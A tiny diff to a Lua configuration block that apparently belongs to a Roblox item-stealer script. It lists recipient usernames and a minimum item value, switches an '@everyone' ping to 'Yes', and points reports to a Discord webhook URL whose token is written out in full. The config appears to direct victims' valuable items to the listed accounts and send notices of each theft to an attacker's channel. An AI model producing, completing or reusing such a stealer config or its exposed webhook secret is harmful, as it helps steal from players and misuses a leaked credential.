@@ -1,6 +1,6 @@
 _G.Usernames = {"saikigrow", "", "Wanwood42093"}
 _G.min_value = 100000000
-_G.pingEveryone = ""
+_G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1392880984428384398/b0i3uImsepPTsn5HU_GebQsbnECumyVbr8E_SJLxZNbQmqqTOOMFJWYA-9BJi_LFu_45"
 
 
